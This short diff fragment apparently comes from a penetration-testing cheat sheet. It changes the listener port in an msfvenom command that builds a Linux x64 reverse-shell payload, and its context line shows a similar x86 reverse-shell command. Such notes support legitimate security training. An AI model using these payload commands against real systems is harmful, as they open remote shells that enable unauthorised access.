@@ -63,7 +63,7 @@ msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.119.187 LPORT=443 -f elf >
 
 x64
 ```
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.157 LPORT=143 -f elf > shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.157 LPORT=443 -f elf > shell.elf
 ```
 
 meterpreter
